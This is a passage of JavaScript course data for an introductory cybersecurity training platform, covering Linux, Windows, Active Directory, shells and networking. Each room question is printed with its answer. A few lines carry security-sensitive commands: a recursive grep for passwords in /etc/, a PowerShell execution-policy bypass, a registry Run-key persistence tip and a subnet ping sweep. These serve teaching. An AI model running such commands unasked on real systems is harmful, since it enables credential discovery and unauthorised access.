        {name:"Linux Fundamentals Part 1", text:"Embark on the journey of learning the fundamentals of Linux. Learn to run some of the first essential commands on an interactive terminal.",
         icon:"🐧", level:"easy", time:"25 min",
         tasks:[
          {title:"Running Your First Commands", notes:`
            <p>Linux commands follow a simple syntax: <code>command [flags] [arguments]</code>. Flags (switches) modify how the command behaves, while arguments specify the target.</p>
            <pre><code># Check current username
whoami

# Output system hostname
hostname

# View current User ID (UID) and Group ID (GID)
id</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which command prints your current username in Linux?</i> <b>whoami</b></li>
            </ul>`},

          {title:"Navigating the File System", notes:`
            <p>Unlike Windows which uses drive letters (<code>C:\\</code>, <code>D:\\</code>), Linux organizes everything under a single hierarchical root directory represented by a forward slash (<code>/</code>).</p>
            <table>
              <thead>
                <tr><th>Command</th><th>Purpose</th><th>Example</th></tr>
              </thead>
              <tbody>
                <tr><td><code>pwd</code></td><td>Print Working Directory (shows where you currently are)</td><td><code>pwd</code></td></tr>
                <tr><td><code>ls</code></td><td>List directory contents (add <code>-la</code> for hidden files &amp; permissions)</td><td><code>ls -la</code></td></tr>
                <tr><td><code>cd</code></td><td>Change directory (use <code>..</code> for parent, <code>~</code> for home)</td><td><code>cd /var/log</code></td></tr>
              </tbody>
            </table>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What does pwd stand for?</i> <b>print working directory</b></li>
            </ul>`},

          {title:"Viewing & Finding Files", notes:`
            <p>Linux provides powerful utilities to inspect and locate files across the system without opening graphical editors:</p>
            <ul>
              <li><code>cat filename</code>: Concatenate and print entire file contents to terminal.</li>
              <li><code>less filename</code>: Paginated viewer allowing scrolling up/down.</li>
              <li><code>head -n 5 file</code>: Display the first 5 lines of a file.</li>
              <li><code>tail -n 5 file</code>: Display the last 5 lines (use <code>-f</code> to follow live log appends).</li>
              <li><code>find / -name "*.conf" 2&gt;/dev/null</code>: Search the entire filesystem for configuration files while suppressing permission errors.</li>
              <li><code>grep -rn "password" /etc/</code>: Recursively search files for specific string patterns.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which flag on tail allows real-time live monitoring of growing log files?</i> <b>-f</b></li>
            </ul>`}
         ]},

        {name:"Linux Fundamentals Part 2", text:"Continue your learning Linux journey with part two. You will be learning how to log in to a Linux machine using SSH, how to advance your commands, file system interaction.",
         icon:"🐧", level:"easy", time:"30 min",
         tasks:[
          {title:"Remote Access via SSH", notes:`
            <p><b>Secure Shell (SSH)</b> runs on port 22 and provides an encrypted, authenticated remote terminal session over untrusted networks.</p>
            <pre><code># Connect with password authentication
ssh username@10.10.10.100

# Connect using a private key file with restricted permissions
chmod 600 id_rsa
ssh -i id_rsa username@10.10.10.100</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the default TCP port used by the SSH service?</i> <b>22</b></li>
            </ul>`},

          {title:"File System Permissions & Ownership", notes:`
            <p>In Linux, every file and directory has three permission categories: <b>User (owner)</b>, <b>Group</b>, and <b>Others (world)</b>.</p>
            <p>Permissions are represented in symbolic form (<code>rwx</code>) and numeric octal notation:</p>
            <ul>
              <li><b>Read (r = 4):</b> View file contents or list directory files.</li>
              <li><b>Write (w = 2):</b> Modify file or create/delete files inside directory.</li>
              <li><b>Execute (x = 1):</b> Run binary/script or traverse into directory.</li>
            </ul>
            <pre><code># chmod 755: User=rwx(7), Group=r-x(5), Others=r-x(5)
chmod 755 script.sh

# Change ownership to user 'alice' and group 'security'
chown alice:security script.sh</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What octal permission number represents read and execute permissions (r-x)?</i> <b>5</b></li>
            </ul>`},

          {title:"Critical Directories & System Files", notes:`
            <p>Security analysts and penetration testers frequently audit specific root directories:</p>
            <ul>
              <li><code>/etc/passwd</code>: World-readable list of all user accounts, UIDs, and default shells.</li>
              <li><code>/etc/shadow</code>: Privileged file containing salted password hashes (readable only by root).</li>
              <li><code>/var/log/</code>: System and service event logs (e.g. <code>/var/log/auth.log</code> for login attempts).</li>
              <li><code>/tmp</code>: Temporary world-writable directory often used by attackers to stage scripts.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which system file stores user password hashes and requires root privileges to read?</i> <b>/etc/shadow</b></li>
            </ul>`}
         ]},

        {name:"Linux Fundamentals Part 3", text:"Power-up your Linux skills with some common utilities that you are likely to use day-to-day!",
         icon:"🐧", level:"easy", time:"30 min",
         tasks:[
          {title:"Package Management & Text Editing", notes:`
            <p>Debian-based distributions (such as Ubuntu and Kali) use the <code>apt</code> package manager to install, update, and manage software repositories:</p>
            <pre><code># Update package list from repositories
sudo apt update

# Install a security tool (e.g. nmap)
sudo apt install -y nmap</code></pre>
            <p>For terminal text editing, <code>nano</code> offers beginner-friendly shortcuts (e.g. <code>Ctrl+O</code> to save, <code>Ctrl+X</code> to exit), while <code>vim</code> offers advanced modal editing.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which command updates the local package index cache from remote repositories?</i> <b>apt update</b></li>
            </ul>`},

          {title:"Process Management & System Services", notes:`
            <p>Linux manages background programs as processes identified by unique <b>Process IDs (PID)</b>:</p>
            <ul>
              <li><code>ps aux</code>: Snapshot of all running processes across all users.</li>
              <li><code>top</code> or <code>htop</code>: Interactive real-time process viewer showing CPU and RAM consumption.</li>
              <li><code>kill -9 &lt;PID&gt;</code>: Send <code>SIGKILL</code> signal to immediately terminate an unresponsive process.</li>
              <li><code>systemctl status &lt;service&gt;</code>: Check systemd daemon status (e.g. <code>systemctl status ssh</code>).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What signal number corresponds to SIGKILL in the kill command?</i> <b>9</b></li>
            </ul>`},

          {title:"Scheduled Automation with Crontab", notes:`
            <p>The <b>cron</b> daemon executes scheduled background tasks defined in <code>crontab</code> files:</p>
            <pre><code># Crontab format:
# ┌───────────── minute (0 - 59)
# │ ┌───────────── hour (0 - 23)
# │ │ ┌───────────── day of month (1 - 31)
# │ │ │ ┌───────────── month (1 - 12)
# │ │ │ │ ┌───────────── day of week (0 - 6, 0=Sunday)
# * * * * * command_to_execute

# Edit current user's crontab
crontab -e

# Example: Run backup script every day at midnight
0 0 * * * /usr/local/bin/backup.sh</code></pre>
            <div class="callout">
              <b>Security Note:</b> Writable scripts executed by root cron jobs are a notorious vector for local privilege escalation!
            </div>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which command is used to view or edit the scheduled cron jobs for the current user?</i> <b>crontab -e</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"🪟", title:"Windows and AD Fundamentals", text:"Get hands-on access to Windows and it's security controls. These basics will help you in identifying, exploiting and defending Windows.",
       intro:"Windows is the most popular operating system, used by individuals and corporate environments worldwide. This module will help you become comfortable using essential Windows features (in a safe environment), including user account permissions, resource management and monitoring, registry access, and security controls. It will also introduce you to Active Directory (AD) basics.",
       rooms:[
        {name:"Windows Fundamentals 1", text:"In part 1 of the Windows Fundamentals module, we'll start our journey learning about the Windows desktop, the NTFS file system, UAC, the Control Panel, and more..",
         icon:"🪟", level:"easy", time:"25 min",
         tasks:[
          {title:"NTFS File System & Permissions", notes:`
            <p>Windows predominantly formats drives using <b>NTFS (New Technology File System)</b>, which supports advanced security descriptors, discretionary access control lists (DACLs), file auditing, and encryption.</p>
            <p>NTFS permissions include <b>Full Control</b>, <b>Modify</b>, <b>Read &amp; Execute</b>, <b>List folder contents</b>, <b>Read</b>, and <b>Write</b>.</p>
            <p>NTFS also supports <b>Alternate Data Streams (ADS)</b>, which allow files to store hidden metadata streams (e.g. <code>file.txt:hidden.exe</code>) — a technique historically abused by malware to evade simple file inspections.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the primary file system used by modern Windows installations?</i> <b>NTFS</b></li>
            </ul>`},

          {title:"User Account Control (UAC)", notes:`
            <p><b>User Account Control (UAC)</b> prevents unauthorized operating system modifications by ensuring standard applications run without administrative privileges. Even logged-in administrators run standard user tokens until prompted with a UAC elevation consent dialog.</p>
            <p>UAC settings can be configured via <code>secpol.msc</code> (Local Security Policy) or the Control Panel slider.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What Windows security mechanism prompts users before applications execute administrative changes?</i> <b>UAC</b></li>
            </ul>`},

          {title:"Computer Management & Administrative Tools", notes:`
            <p>The <b>Computer Management</b> console (<code>compmgmt.msc</code>) unites essential administrative snap-ins:</p>
            <ul>
              <li><b>Local Users and Groups:</b> Creating local accounts, assigning users to the local <code>Administrators</code> group.</li>
              <li><b>Device Manager:</b> Hardware driver auditing and peripheral status.</li>
              <li><b>Disk Management:</b> Partitioning, volume resizing, and formatting.</li>
              <li><b>Event Viewer:</b> System, Application, and Security audit logs.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What command opens the Computer Management console in Windows?</i> <b>compmgmt.msc</b></li>
            </ul>`}
         ]},

        {name:"Windows Fundamentals 2", text:"In part 2 of the Windows Fundamentals module, discover more about System Configuration, UAC Settings, Resource Monitoring, the Windows Registry and more..",
         icon:"🪟", level:"easy", time:"30 min",
         tasks:[
          {title:"System Configuration & Resource Monitoring", notes:`
            <p>Windows offers built-in diagnostic interfaces to inspect system health and running processes:</p>
            <ul>
              <li><b>Task Manager (<code>taskmgr</code>):</b> Real-time visualization of CPU, Memory, Disk, and Network utilization, alongside active process trees and startup applications.</li>
              <li><b>Resource Monitor (<code>resmon</code>):</b> Granular breakdown of individual process disk I/O queues and active network socket connections.</li>
              <li><b>System Configuration (<code>msconfig</code>):</b> Configures safe boot options, diagnostic startup, and background services.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which utility provides detailed real-time breakdown of per-process network connections and disk I/O?</i> <b>Resource Monitor</b></li>
            </ul>`},

          {title:"The Windows Registry", notes:`
            <p>The <b>Windows Registry</b> is a hierarchical central database storing low-level configurations for the OS, hardware drivers, security accounts manager (SAM), and third-party software.</p>
            <p>The registry is divided into five root keys (hives):</p>
            <table>
              <thead>
                <tr><th>Hive</th><th>Full Name</th><th>Purpose</th></tr>
              </thead>
              <tbody>
                <tr><td><code>HKLM</code></td><td>HKEY_LOCAL_MACHINE</td><td>Global system-wide settings applying to all users</td></tr>
                <tr><td><code>HKCU</code></td><td>HKEY_CURRENT_USER</td><td>Configuration specific to the currently logged-in user</td></tr>
                <tr><td><code>HKCR</code></td><td>HKEY_CLASSES_ROOT</td><td>File associations and OLE/COM registrations</td></tr>
                <tr><td><code>HKU</code></td><td>HKEY_USERS</td><td>Individual profiles for all loaded user accounts</td></tr>
                <tr><td><code>HKCC</code></td><td>HKEY_CURRENT_CONFIG</td><td>Hardware profile data gathered at boot time</td></tr>
              </tbody>
            </table>
            <div class="callout">
              <b>Persistence Vector:</b> Attackers establish stealthy reboot persistence by writing malware paths into <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>!
            </div>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which registry hive stores machine-wide settings applicable to all users?</i> <b>HKEY_LOCAL_MACHINE</b></li>
            </ul>`}
         ]},

        {name:"Windows Fundamentals 3", text:"In part 3 of the Windows Fundamentals module, learn about the built-in Microsoft tools that help keep the device secure, such as Windows Updates, Windows Security, BitLocker, and more...",
         icon:"🪟", level:"easy", time:"30 min",
         tasks:[
          {title:"Windows Security & Defender", notes:`
            <p><b>Windows Security</b> (formerly Windows Defender) serves as the default endpoint protection suite built directly into Windows 10/11 and Windows Server:</p>
            <ul>
              <li><b>Virus &amp; Threat Protection:</b> Real-time file system scanning, heuristic detection, and cloud-delivered behavioral analysis.</li>
              <li><b>Tamper Protection:</b> Prevents malicious programs from disabling real-time protection through registry or PowerShell modifications.</li>
              <li><b>Controlled Folder Access:</b> Anti-ransomware barrier that prevents untrusted processes from modifying files inside protected folders (Documents, Desktop).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What Windows feature blocks unauthorized applications from modifying protected personal directories?</i> <b>Controlled Folder Access</b></li>
            </ul>`},

          {title:"BitLocker Drive Encryption", notes:`
            <p><b>BitLocker</b> is full-volume disk encryption feature designed to protect data at rest against physical theft, lost devices, or offline hardware access.</p>
            <p>BitLocker natively integrates with a <b>Trusted Platform Module (TPM)</b> chip soldered to the motherboard. The TPM securely validates boot environment integrity before releasing cryptographic volume encryption keys (FVEK).</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What physical hardware motherboard chip does BitLocker use to verify boot integrity?</i> <b>TPM</b></li>
            </ul>`},

          {title:"Windows Defender Firewall with Advanced Security", notes:`
            <p>The Advanced Firewall (<code>wf.msc</code>) implements host-based stateful packet inspection across three network location profiles:</p>
            <ul>
              <li><b>Domain Profile:</b> Applied when connected to an authenticated Active Directory domain network.</li>
              <li><b>Private Profile:</b> Applied to trusted home or small office networks (file sharing permitted).</li>
              <li><b>Public Profile:</b> Applied to untrusted public Wi-Fi networks (all unsolicited inbound connections blocked).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which firewall profile is activated when connected to an untrusted public Wi-Fi hotspot?</i> <b>Public</b></li>
            </ul>`}
         ]},

        {name:"Active Directory Basics", text:"This room will introduce the basic concepts and functionality provided by Active Directory.",
         icon:"🏢", level:"easy", time:"35 min",
         tasks:[
          {title:"Active Directory Architecture", notes:`
            <p><b>Active Directory Domain Services (AD DS)</b> is Microsoft's directory service providing centralized identity management, single sign-on (SSO), and policy enforcement across enterprise networks.</p>
            <p>Core structural components include:</p>
            <ul>
              <li><b>Domain Controller (DC):</b> The server hosting Active Directory databases (<code>ntds.dit</code>) and responding to authentication requests.</li>
              <li><b>Domain:</b> A security boundary sharing a common directory database and security policies.</li>
              <li><b>Tree &amp; Forest:</b> A hierarchy of domains sharing a contiguous namespace (Tree) and a collection of trees sharing a global catalog and two-way transitive trusts (Forest).</li>
              <li><b>Organizational Units (OUs):</b> Sub-containers within a domain used to organize users, computers, and groups for policy assignment.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What server role responds to authentication requests and hosts the AD database?</i> <b>Domain Controller</b></li>
            </ul>`},

          {title:"Kerberos Authentication Protocol", notes:`
            <p>Active Directory uses <b>Kerberos</b> as its primary authentication protocol over port 88. Kerberos relies on cryptographic tickets issued by the <b>Key Distribution Center (KDC)</b> on the Domain Controller:</p>
            <ol>
              <li><b>AS-REQ / AS-REP:</b> Client sends timestamp encrypted with user password hash; KDC verifies and returns a <b>Ticket Granting Ticket (TGT)</b>.</li>
              <li><b>TGS-REQ / TGS-REP:</b> Client presents TGT to request a service ticket for a specific resource identified by a <b>Service Principal Name (SPN)</b>.</li>
              <li><b>AP-REQ / AP-REP:</b> Client presents the service ticket to the target service (e.g. file server or web app) to gain access without re-entering passwords.</li>
            </ol>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What standard TCP/UDP port does the Kerberos authentication service run on?</i> <b>88</b></li>
            </ul>`},

          {title:"Group Policy Objects (GPOs)", notes:`
            <p><b>Group Policy Objects (GPOs)</b> enable administrators to deploy centralized configuration settings and security controls across thousands of endpoints simultaneously.</p>
            <p>Common security policies enforced via GPO include password complexity rules, account lockout thresholds, disabling USB storage devices, software restriction policies, and enforcing BitLocker encryption.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What feature in Active Directory enables centralized configuration deployment across domain machines?</i> <b>Group Policy</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"💻", title:"Command Line", text:"Learn the command line and MS PowerShell in Windows by practising various essential commands. Then, discover the use of Bash in the Linux OS.",
       intro:"Understanding command-line interfaces (CLI) is essential, as many security tools and tasks require their configuration and usage through them. CLIs are imperative for scripting and automation and can prove very helpful in carrying out penetration testing and incident analysis. This module will teach us how to use the command line and PowerShell in Windows and Bash in Linux.",
       rooms:[
        {name:"Windows Command Line", text:"Learn the essential Windows commands.",
         icon:"💻", level:"easy", time:"25 min",
         tasks:[
          {title:"File Management in Command Prompt", notes:`
            <p>The Windows Command Prompt (<code>cmd.exe</code>) has been the traditional CLI environment since MS-DOS. Key file commands include:</p>
            <table>
              <thead>
                <tr><th>Command</th><th>Purpose</th><th>Example</th></tr>
              </thead>
              <tbody>
                <tr><td><code>dir</code></td><td>List directory contents (add <code>/a</code> for hidden files)</td><td><code>dir /s</code></td></tr>
                <tr><td><code>cd</code></td><td>Change directory (use <code>/d</code> to change drive letter)</td><td><code>cd /d D:\\data</code></td></tr>
                <tr><td><code>type</code></td><td>Display text file contents to screen (equivalent to Linux <code>cat</code>)</td><td><code>type secret.txt</code></td></tr>
                <tr><td><code>copy</code> / <code>move</code></td><td>Copy or move files to destination directory</td><td><code>copy file.txt backup.txt</code></td></tr>
                <tr><td><code>del</code> / <code>rmdir</code></td><td>Delete files or directories</td><td><code>del temp.log</code></td></tr>
              </tbody>
            </table>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which CMD command displays the text content of a file on the terminal?</i> <b>type</b></li>
            </ul>`},

          {title:"System & Network Enumeration Commands", notes:`
            <p>Security responders and penetration testers rely on built-in CMD utilities during initial triage:</p>
            <pre><code># Check network adapters, IP configuration, and gateway
ipconfig /all

# Display active TCP connections and listening ports with PID
netstat -ano

# Check assigned user privileges and token group memberships
whoami /priv

# Query detailed operating system version and patch hotfixes
systeminfo

# List local user accounts on the machine
net user</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which command and flag displays all assigned privileges for the current Windows user?</i> <b>whoami /priv</b></li>
            </ul>`}
         ]},

        {name:"Windows PowerShell", text:"Discover the \"Power\" in PowerShell and learn the basics.",
         icon:"⚡", level:"easy", time:"30 min",
         tasks:[
          {title:"Cmdlets & The Verb-Noun Convention", notes:`
            <p><b>PowerShell</b> is an object-oriented shell and scripting language built on the .NET runtime. Unlike traditional shells that pass unstructured plaintext streams, PowerShell passes rich, strongly-typed .NET objects through its pipelines.</p>
            <p>PowerShell commands are called <b>Cmdlets</b> and adhere to a strict <code>Verb-Noun</code> naming pattern (e.g. <code>Get-Process</code>, <code>Start-Service</code>, <code>New-Item</code>, <code>Remove-Item</code>).</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What naming convention do all standard PowerShell cmdlets follow?</i> <b>Verb-Noun</b></li>
            </ul>`},

          {title:"Piping Objects & Filtering", notes:`
            <p>Because pipeline items are objects with methods and properties, PowerShell allows powerful inline queries:</p>
            <pre><code># Filter running processes using Where-Object
Get-Process | Where-Object { $_.CPU -gt 10 }

# Select specific properties for formatted display
Get-Service | Select-Object -Property Name, Status, StartType

# Sort and output top 5 memory consuming applications
Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 5</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which cmdlet is used in PowerShell to filter objects passed through the pipeline?</i> <b>Where-Object</b></li>
            </ul>`},

          {title:"PowerShell Security & Execution Policies", notes:`
            <p>To prevent users from inadvertently executing untrusted scripts, PowerShell enforces <b>Execution Policies</b>:</p>
            <ul>
              <li><code>Restricted</code>: Default client setting; no scripts can run.</li>
              <li><code>RemoteSigned</code>: Local scripts run; downloaded scripts require digital signature.</li>
              <li><code>Unrestricted</code>: All scripts run with a prompt for downloaded files.</li>
              <li><code>Bypass</code>: Nothing is blocked; used by administrators and deployment tools.</li>
            </ul>
            <div class="callout">
              <b>Security Clarification:</b> Execution policy is an administrative guardrail, NOT a security boundary! It can be bypassed using <code>powershell -ExecutionPolicy Bypass -File script.ps1</code>.
            </div>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which execution policy allows all scripts to execute without warning or signature enforcement?</i> <b>Bypass</b></li>
            </ul>`}
         ]},

        {name:"Linux Shells", text:"Learn about scripting and the different types of Linux shells.",
         icon:"🐚", level:"easy", time:"30 min",
         tasks:[
          {title:"Shell Environments & Variables", notes:`
            <p>A shell is a command-line interpreter that executes commands and exposes system environment variables:</p>
            <ul>
              <li><code>echo $SHELL</code>: Displays current default login shell (e.g. <code>/bin/bash</code>, <code>/bin/zsh</code>).</li>
              <li><code>$PATH</code>: Colon-separated list of directories searched when executing binary names.</li>
              <li><code>export VAR="value"</code>: Exports a variable so child processes inherit it.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which environment variable contains the list of directories searched for executable programs?</i> <b>PATH</b></li>
            </ul>`},

          {title:"I/O Redirection & Pipelines", notes:`
            <p>Linux processes communicate using three standard file descriptors: <code>stdin (0)</code>, <code>stdout (1)</code>, and <code>stderr (2)</code>.</p>
            <pre><code># Redirect stdout and overwrite file
ls -la > output.txt

# Append stdout without overwriting
echo "audit complete" >> output.txt

# Redirect stderr to discard errors
find / -perm -u=s 2>/dev/null

# Pipe stdout of one process into stdin of another
cat /var/log/auth.log | grep "Failed password" | wc -l</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which redirection operator appends stdout to the end of a file without overwriting?</i> <b>>></b></li>
            </ul>`},

          {title:"Bash Scripting Fundamentals", notes:`
            <p>Bash scripts automate complex multistep tasks. Every script begins with a <b>Shebang</b> pointing to the interpreter:</p>
            <pre><code>#!/bin/bash
# Network sweep script
TARGET_NET="192.168.1"
echo "[*] Scanning subnet $TARGET_NET.0/24..."

for ip in $(seq 1 254); do
    ping -c 1 -W 1 $TARGET_NET.$ip > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] Host alive: $TARGET_NET.$ip"
    fi
done</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the character sequence called at line 1 of a script that specifies the interpreter?</i> <b>shebang</b></li>
            </ul>`}
         ]}
       ]}
,
      {icon:"🌐", title:"Networking", text:"Learn about the OSI model and TCP/IP networking layers. Explore the different plaintext and secure networking protocols that we use every day.",
       intro:"This module aims to introduce you to the ISO OSI and TCP/IP models and present all the main protocols necessary for networks to function. It also introduces all the essential protocols for web browsing, file transfer, email, and remote administration.",
       rooms:[
        {name:"Networking Concepts", text:"Learn about the ISO OSI model and the TCP/IP protocol suite.",
         icon:"🌐", level:"easy", time:"30 min",
         tasks:[
          {title:"The OSI 7-Layer Architecture", notes:`
            <p>The <b>OSI (Open Systems Interconnection)</b> model is a 7-layer theoretical framework describing how data travels from an end-user application across physical cables to another computer.</p>
            ${osiLayersSVG()}
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which OSI layer is responsible for logical routing of packets across networks?</i> <b>Network</b></li>
            </ul>`},

          {title:"TCP/IP Suite & Encapsulation", notes:`
            <p>While OSI is a conceptual model, the <b>TCP/IP Suite</b> is the practical protocol architecture that powers the global Internet. It condenses network communication into 4 practical layers:</p>
            <ol>
              <li><b>Application Layer:</b> HTTP, DNS, SSH, FTP, SMTP.</li>
              <li><b>Transport Layer:</b> TCP (reliable stream) and UDP (connectionless datagrams).</li>
              <li><b>Internet Layer:</b> IP (IPv4 and IPv6) and ICMP (Ping).</li>
              <li><b>Network Access (Link) Layer:</b> Ethernet, Wi-Fi frames, ARP, MAC hardware addressing.</li>
            </ol>
            ${encapsulationFlowSVG()}
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the process called where each layer wraps data in its own protocol header?</i> <b>Encapsulation</b></li>
            </ul>`},

          {title:"Network Topologies", notes:`
            <p>Network topology describes how physical devices are wired and organized together:</p>
            ${networkTopologySVG()}
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which network topology connects all nodes to a central switch or hub?</i> <b>Star</b></li>
            </ul>`}
         ]},

        {name:"Networking Essentials", text:"Explore networking protocols from automatic configuration to routing packets to the destination.",
         icon:"🌐", level:"easy", time:"25 min",
         tasks:[
          {title:"IP Addressing & Subnetting", notes:`
            <p>Every internet-connected host requires an <b>IP Address</b>. IPv4 addresses are 32-bit numbers formatted as 4 octets (e.g. <code>192.168.1.15</code>).</p>
            <p><b>CIDR (Classless Inter-Domain Routing)</b> notation designates the network portion vs host portion using a slash prefix:</p>
            <ul>
              <li><code>192.168.1.0/24</code>: Subnet mask <code>255.255.255.0</code>. 24 network bits, 8 host bits (254 usable client IPs).</li>
              <li><code>10.0.0.0/8</code>: Large private enterprise network mask (16 million hosts).</li>
              <li><b>Private RFC 1918 Ranges:</b> <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code> (non-routable on public internet).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the subnet mask for a /24 network prefix?</i> <b>255.255.255.0</b></li>
            </ul>`},

          {title:"MAC Addresses & ARP", notes:`
            <p>While IP addresses operate at Layer 3 to route packets across routers, physical local delivery across switches relies on Layer 2 <b>MAC (Media Access Control)</b> addresses.</p>
            <p>A MAC address is a 48-bit identifier burned into hardware (e.g. <code>00:1A:2B:3C:4D:5E</code>). The first 24 bits represent the <b>OUI (Organizationally Unique Identifier)</b> identifying the hardware manufacturer.</p>
            <p>The <b>ARP (Address Resolution Protocol)</b> resolves IP addresses to local MAC addresses by broadcasting <i>"Who has 192.168.1.1? Tell 192.168.1.10"</i>.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which protocol maps an IP address to a local physical MAC address?</i> <b>ARP</b></li>
            </ul>`},

          {title:"DHCP DORA Process", notes:`
            <p>The <b>Dynamic Host Configuration Protocol (DHCP)</b> automatically assigns IP addresses, subnet masks, default gateways, and DNS servers to connecting clients through a 4-step handshake:</p>
            ${dhcpDoraSVG()}
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the acronym for the 4-step DHCP address leasing process?</i> <b>DORA</b></li>
            </ul>`}
         ]},

        {name:"Networking Core Protocols", text:"Learn about the core TCP/IP protocols.",
         icon:"🌐", level:"easy", time:"30 min",
         tasks:[
          {title:"TCP vs UDP Protocols", notes:`
            <p>Transport Layer protocols govern how applications transmit data streams:</p>
            <table>
              <thead>
                <tr><th>Feature</th><th>TCP (Transmission Control Protocol)</th><th>UDP (User Datagram Protocol)</th></tr>
              </thead>
              <tbody>
                <tr><td><b>Connection</b></td><td>Connection-oriented (Requires 3-way handshake)</td><td>Connectionless (Fire-and-forget)</td></tr>
                <tr><td><b>Reliability</b></td><td>Guaranteed delivery with packet acknowledgments &amp; retransmission</td><td>No delivery guarantee; dropped packets are ignored</td></tr>
                <tr><td><b>Ordering</b></td><td>Packets sequenced and reassembled in order</td><td>No ordering guarantee</td></tr>
                <tr><td><b>Use Cases</b></td><td>Web browsing (HTTP/S), file transfer, email, SSH</td><td>Video streaming, VoIP calls, online gaming, DNS queries</td></tr>
              </tbody>
            </table>
            ${tcpHandshakeSVG()}
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which transport protocol guarantees packet delivery through acknowledgments and sequence numbers?</i> <b>TCP</b></li>
            </ul>`},

          {title:"DNS Resolution Hierarchy", notes:`
            <p>The <b>Domain Name System (DNS)</b> functions as the phonebook of the Internet, translating human-readable names (<code>tryhackme.com</code>) into IP addresses (<code>104.26.11.229</code>).</p>
            ${domainTreeSVG()}
            <p>Common DNS record types include:</p>
            <ul>
              <li><b>A:</b> Maps hostname to an IPv4 address.</li>
              <li><b>AAAA:</b> Maps hostname to an IPv6 address.</li>
              <li><b>MX:</b> Mail Exchanger routing email traffic.</li>
              <li><b>TXT:</b> Text records storing SPF, DKIM, and domain verification strings.</li>
              <li><b>CNAME:</b> Canonical Name alias pointing to another domain name.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which DNS record type maps a domain name to an IPv4 address?</i> <b>A</b></li>
            </ul>`},

          {title:"Common Network Services & Ports", notes:`
            <p>Network services bind to standardized port numbers (0 to 65535). Well-known ports (0–1023) include:</p>
            <ul>
              <li><b>Port 21:</b> FTP (File Transfer Protocol)</li>
              <li><b>Port 22:</b> SSH (Secure Shell)</li>
              <li><b>Port 25:</b> SMTP (Simple Mail Transfer Protocol)</li>
              <li><b>Port 53:</b> DNS (Domain Name System)</li>
              <li><b>Port 80:</b> HTTP (HyperText Transfer Protocol)</li>
              <li><b>Port 443:</b> HTTPS (HTTP over TLS/SSL)</li>
              <li><b>Port 445:</b> SMB (Server Message Block file sharing)</li>
              <li><b>Port 3389:</b> RDP (Remote Desktop Protocol)</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the default port used by encrypted web traffic over HTTPS?</i> <b>443</b></li>
            </ul>`}
         ]},

        {name:"Networking Secure Protocols", text:"Learn how TLS, SSH, and VPN can secure your network traffic.",
         icon:"🔒", level:"easy", time:"30 min",
         tasks:[
          {title:"Transport Layer Security (TLS/SSL)", notes:`
            <p>Unencrypted protocols (like HTTP, Telnet, and FTP) transmit data across the wire in plaintext, allowing eavesdroppers on the same network to intercept passwords and cookies.</p>
            <p><b>TLS (Transport Layer Security)</b> encrypts network sockets using a hybrid cryptographic architecture:</p>
            <ol>
              <li><b>Asymmetric Authentication:</b> The server presents a digital X.509 certificate signed by a trusted Certificate Authority (CA) to prove its identity and share its public key.</li>
              <li><b>Key Exchange:</b> Client and server perform an ephemeral Diffie-Hellman exchange to generate a shared secret session key.</li>
              <li><b>Symmetric Encryption:</b> All subsequent HTTP application traffic is encrypted with high-speed AES symmetric keys.</li>
            </ol>
            ${httpsSVG()}
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What digital document does a web server present to prove its cryptographic identity during a TLS handshake?</i> <b>Certificate</b></li>
            </ul>`},

          {title:"SSH Cryptographic Tunneling", notes:`
            <p><b>SSH</b> replaced insecure plaintext Telnet by encrypting terminal communications with public-key cryptography. In addition to shell access, SSH provides powerful tunneling capabilities:</p>
            <pre><code># Local port forwarding: tunnel remote MySQL (port 3306) to local port 3306
ssh -L 3306:127.0.0.1:3306 user@remote-server

# Dynamic SOCKS proxy: forward any traffic through remote SSH server
ssh -D 1080 user@remote-server</code></pre>
            <p><b>Room question:</b></p>
            <ul>
